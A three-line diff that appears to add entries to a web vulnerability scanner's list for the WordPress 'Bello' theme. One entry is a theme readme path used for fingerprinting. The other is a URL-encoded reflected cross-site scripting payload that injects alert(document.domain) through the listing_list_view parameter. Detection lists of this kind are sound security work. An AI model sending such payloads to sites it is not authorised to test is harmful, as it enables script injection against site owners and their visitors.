@@ -1,0 +1,3 @@
+
+/wp-content/themes/bello/readme.txt
+/listing/?listing_list_view=standard13%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
